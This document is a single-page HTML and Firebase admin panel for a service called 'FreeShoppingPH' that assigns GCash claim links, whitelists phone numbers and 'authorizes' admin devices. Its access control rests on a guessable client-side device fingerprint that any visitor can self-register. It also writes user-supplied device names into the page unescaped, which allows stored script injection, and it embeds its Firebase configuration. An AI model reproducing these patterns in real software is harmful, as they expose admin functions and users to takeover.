<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FS Admin | Multi-Device Access</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;900&family=Quicksand:wght@700&display=swap" rel="stylesheet">
    
    <style>
        :root { 
            --ph-blue: #0038a8; --ph-red: #ce1126; --ph-yellow: #fcd116; --dark: #0f172a;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body { 
            font-family: 'Public Sans', sans-serif; background: #f1f5f9; min-height: 100vh; color: var(--dark);
        }

        /* --- PH FLAG TITLE --- */
        .header-app {
            padding: 40px 20px 25px; text-align: center; background: white;
            border-bottom: 4px solid var(--ph-yellow); box-shadow: 0 4px 15px rgba(0,0,0,0.05);
        }

        .flag-text {
            font-family: 'Quicksand', sans-serif; font-size: 28px; font-weight: 900;
            display: inline-block;
            background: linear-gradient(to bottom, 
                var(--ph-blue) 0%, var(--ph-blue) 45%, 
                #fff 45%, var(--ph-yellow) 50%, 
                var(--ph-red) 55%, var(--ph-red) 100%
            );
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase;
        }

        .container { padding: 15px; }

        details {
            background: white; border-radius: 18px; margin-bottom: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.02); border: 1px solid #e2e8f0; overflow: hidden;
        }

        summary {
            padding: 22px; font-weight: 800; font-size: 14px; list-style: none;
            display: flex; justify-content: space-between; align-items: center; color: #475569;
        }

        summary::after { content: '＋'; color: var(--ph-blue); }
        details[open] summary { background: #f8fafc; color: var(--ph-blue); }

        .content { padding: 0 20px 20px 20px; border-top: 1px solid #f1f5f9; padding-top: 15px; }

        /* --- BUTTONS --- */
        .btn-app {
            width: 100%; padding: 16px; border-radius: 14px; border: none;
            font-weight: 900; font-size: 14px; cursor: pointer; transition: 0.2s; margin-top: 5px;
        }
        .btn-primary { background: var(--ph-blue); color: white; }
        .btn-auth { background: #0f172a; color: var(--ph-yellow); border: 1px solid var(--ph-yellow); }
        .btn-sec-red { background: var(--ph-red); color: white; }

        /* Device List Styling */
        .dev-item {
            display: flex; justify-content: space-between; align-items: center;
            background: #f8fafc; padding: 10px; border-radius: 10px; margin-top: 8px;
            border-left: 4px solid var(--ph-blue); font-size: 11px;
        }

        .lights { position: fixed; top: 0; width: 100%; height: 5px; display: flex; z-index: 100; }
        .l-red { flex: 1; background: var(--ph-red); }
        .l-blue { flex: 1; background: var(--ph-blue); }
    </style>
</head>
<body>

    <div class="lights"><div class="l-red"></div><div class="l-blue"></div></div>

    <div class="header-app">
        <h1 class="flag-text">FreeShoppingPH Admin</h1>
        <p style="font-size: 10px; font-weight: 800; color: #94a3b8; margin-top: 5px;">
            CURRENT DEVICE SIG: <span id="mySigDisplay" style="color:var(--ph-blue)">...</span>
        </p>
    </div>

    <div class="container">
        
        <details class="exclusive-tab">
            <summary>Claiming Portal Links</summary>
            <div class="content">
                <textarea id="gcashLink" rows="2" placeholder="Paste GCash Link..."></textarea>
                <button class="btn-app btn-primary" onclick="assignLink()">ASSIGN PORTAL LINK</button>
            </div>
        </details>

        <details class="exclusive-tab">
            <summary>Security & Whitelist</summary>
            <div class="content">
                <button class="btn-app btn-sec-red" id="masterBtn" onclick="toggleSystem()" style="margin-bottom: 15px;">STRICT MODE</button>
                <input type="tel" id="whiteNum" placeholder="Whitelist: 09xxxxxxxxx">
                <button class="btn-app" style="background:#10b981; color:white;" onclick="handleWhitelistAction()">SAVE ACCESS</button>
            </div>
        </details>

        <details class="exclusive-tab">
            <summary>Authorize Admin Devices</summary>
            <div class="content">
                <p style="font-size: 11px; color: #64748b; margin-bottom: 12px;">
                    Register multiple devices here. Every device has a unique LinkSignature.
                </p>
                
                <button class="btn-app btn-auth" onclick="registerAdminDevice()">AUTHORIZE THIS DEVICE</button>

                <div id="authList" style="margin-top: 20px;">
                    <p style="font-size: 10px; font-weight: 900; color: #475569; border-bottom: 1px solid #e2e8f0; padding-bottom: 5px;">AUTHORIZED DEVICES:</p>
                    <div id="deviceContainer"></div>
                </div>
            </div>
        </details>

    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
            authDomain: "freeshoppingph-3bade.firebaseapp.com",
            databaseURL: "https://freeshoppingph-3bade-default-rtdb.firebaseio.com",
            projectId: "freeshoppingph-3bade",
            storageBucket: "freeshoppingph-3bade.appspot.com",
            messagingSenderId: "1028308831969",
            appId: "1:1028308831969:web:96e224e75d69ba74332924"
        };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const db = firebase.database();

        // 1. GENERATE UNIQUE SIGNATURE PER DEVICE
        function getSig() {
            // Gumagamit ng combination ng UserAgent + Screen Specs para maging unique
            const str = navigator.userAgent + screen.width + screen.height + navigator.hardwareConcurrency;
            const hash = btoa(str).substring(0, 12);
            document.getElementById('mySigDisplay').innerText = hash;
            return hash;
        }
        const mySignature = getSig();

        // 2. REGISTER NEW DEVICE (MULTI-ACCESS)
        function registerAdminDevice() {
            const devName = prompt("Enter Device Name (e.g. My Android, Laptop, Partner Phone):");
            if(!devName) return;

            db.ref('authorized_admins/' + mySignature).set({
                deviceName: devName,
                registeredAt: Date.now(),
                userAgent: navigator.userAgent
            }).then(() => alert(devName + " is now Authorized!"));
        }

        // 3. DISPLAY ALL AUTHORIZED DEVICES (REALTIME)
        db.ref('authorized_admins').on('value', snap => {
            const container = document.getElementById('deviceContainer');
            container.innerHTML = '';
            if(!snap.exists()) {
                container.innerHTML = '<p style="font-size:10px; color:gray; margin-top:10px;">No devices registered.</p>';
                return;
            }
            snap.forEach(child => {
                const data = child.val();
                const isThisDevice = child.key === mySignature ? '<b style="color:green">(Current)</b>' : '';
                container.innerHTML += `
                    <div class="dev-item">
                        <div>
                            <b>${data.deviceName}</b> ${isThisDevice}<br>
                            <span style="color:gray; font-size:9px;">SIG: ${child.key}</span>
                        </div>
                        <button onclick="removeDevice('${child.key}')" style="background:none; border:none; color:red; font-weight:800; font-size:10px;">X</button>
                    </div>
                `;
            });
        });

        function removeDevice(key) {
            if(confirm("Remove this device's access?")) {
                db.ref('authorized_admins/' + key).remove();
            }
        }

        // --- ACCORDION & CORE LOGIC ---
        const allTabs = document.querySelectorAll('.exclusive-tab');
        allTabs.forEach(tab => {
            tab.addEventListener('toggle', function() {
                if (this.open) allTabs.forEach(t => { if (t !== this) t.removeAttribute('open'); });
            });
        });

        // SYSTEM STATUS
        db.ref('system_status').on('value', snap => {
            const mode = snap.val()?.mode || 'strict';
            const btn = document.getElementById('masterBtn');
            btn.innerText = mode === 'open' ? "SYSTEM: OPEN" : "SYSTEM: STRICT";
            btn.style.background = mode === 'open' ? "#3b82f6" : "#ce1126";
        });

        function toggleSystem() {
            const current = document.getElementById('masterBtn').innerText;
            const newMode = current.includes("STRICT") ? "open" : "strict";
            db.ref('system_status').update({ mode: newMode });
        }

        // MOCKUP FOR ASSIGN PORTAL
        async function assignLink() {
            const url = document.getElementById('gcashLink').value.trim();
            if(!url) return;
            await db.ref('AvailLinks').push({ url, status: 'available', beneficiary: 'NONE' });
            document.getElementById('gcashLink').value = '';
            alert("Portal Link Updated!");
        }
    </script>
</body>
</html>
